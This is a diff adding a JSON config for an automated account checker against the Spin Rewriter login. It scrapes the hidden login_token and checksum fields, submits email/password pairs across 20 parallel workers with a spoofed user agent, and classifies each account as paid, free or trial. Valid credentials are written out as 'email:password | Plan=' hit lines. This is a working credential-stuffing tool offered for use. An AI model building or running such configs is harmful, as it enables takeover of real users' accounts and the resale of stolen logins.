@@ -1,0 +1,64 @@
+{
+  "id": "spinrewriter",
+  "name": "Spin Rewriter",
+  "description": "Custom PHP login at spinrewriter.com — login_token + checksum required",
+  "source_capture": "task_20260619_113740",
+  "settings": {
+    "workers": 20,
+    "timeout_seconds": 45,
+    "retry_on_error": 5,
+    "delay_ms": 150
+  },
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+  "variables": {
+    "base_url": "https://www.spinrewriter.com",
+    "login_url": "https://www.spinrewriter.com/log-in",
+    "login_post_url": "https://www.spinrewriter.com/action/log-in",
+    "account_url": "https://www.spinrewriter.com/cp-account",
+    "member_url": "https://www.spinrewriter.com/cp-account",
+    "logout_url": "https://www.spinrewriter.com/action/log-out"
+  },
+  "steps": [
+    {
+      "id": "login_page",
+      "name": "GET /log-in — scrape login_token and checksum hidden fields",
+      "method": "GET",
+      "url": "{{login_url}}"
+    },
+    {
+      "id": "login_post",
+      "name": "POST /action/log-in (email, password, login_token, checksum, browser_timezone)",
+      "method": "POST",
+      "url": "{{login_post_url}}",
+      "body": "application/x-www-form-urlencoded"
+    },
+    {
+      "id": "account",
+      "name": "GET /cp-account — subscription status from My Account HTML",
+      "method": "GET",
+      "url": "{{account_url}}",
+      "optional": true
+    }
+  ],
+  "plan_labels": {
+    "PAID": { "label": "PAID" },
+    "FREE": { "label": "FREE" },
+    "FREE_TRIAL": { "label": "FREE_TRIAL" },
+    "UNKNOWN": { "label": "UNKNOWN" }
+  },
+  "output": {
+    "hit_line": "{{email}}:{{password}} | Plan={{plan_name}} | Label={{plan_label}}",
+    "console_hit": "[HIT] {{email}} | Plan: {{plan_name}} ({{plan_label}})",
+    "console_fail": "[FAIL] {{email}} | {{reason}}"
+  },
+  "notes": [
+    "login_token and checksum are fresh hidden fields — scrape on each GET /log-in.",
+    "POST fields: email, password, login_token, checksum, return_path, browser_timezone, submit=1.",
+    "Success: redirect to /cp-account, /cp-home, or other /cp-* app pages.",
+    "Failure: div.alert--error — 'Invalid email or password.'",
+    "FREE: paddle_button_js upgrade CTAs / pricing grid on /cp-account (no cancel link).",
+    "PAID: click_cancel_braintree_subscription or click_cancel_paddle_subscription on /cp-account.",
+    "FREE_TRIAL: active trial markers with cancel link or days-left text.",
+    "After each successful login check, GET /action/log-out is called to avoid session pile-up."
+  ]
+}
